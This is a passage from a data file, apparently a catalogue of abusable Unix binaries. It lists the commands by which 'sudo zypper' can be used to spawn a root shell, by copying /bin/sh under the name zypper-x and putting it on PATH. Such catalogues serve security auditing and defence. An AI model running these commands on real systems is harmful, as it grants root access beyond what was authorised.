                    },
                ],
                sudo: [
                    {
                        description:
                            "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.",
                        code: "sudo zypper x\n",
                    },
                    {
                        code: "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n",
                    },
                ],
            },
        },
    },
];